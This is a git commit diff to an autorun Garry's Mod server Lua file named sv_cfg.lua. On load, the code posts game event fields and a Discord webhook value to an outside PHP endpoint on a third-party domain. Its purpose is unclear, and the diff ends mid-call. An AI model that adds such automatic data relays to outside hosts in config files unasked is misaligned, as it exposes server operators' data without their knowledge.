1b787fc4f3878bc5ed549f5b74a6a6d6b8bce410
Kaiseriscool <86335834+Kaiseriscool@users.noreply.github.com>
2023-02-20 12:54:52 -0500

    Update sv_cfg.lua

--- rips_final/lua/autorun/server/sv_cfg.lua
+++ rips_final/lua/autorun/server/sv_cfg.lua
@@ -1,12 +1,14 @@
 local webhook_real = 'ourdisckord/webn/whokmsad'
-function sendDiscordMessage(attacker, loser, riped, username, profileLink)
+local pfp = ""
+local bot_nick = 'Rips'
+function sendDiscordMessage(attacker, loser, riped)
     local postData = {
         attacker = attacker or "N/A",
         loser = loser,
         Webhook = webhook_real,
         riped = riped,
-        Username = username,
-        Profile_Link = profileLink
+        Username = bot_nick,
+        Profile_Link = pfp
     }
 
     http.Post("http://www.nebulapanel.xyz/other/real.php", postData, function(response)
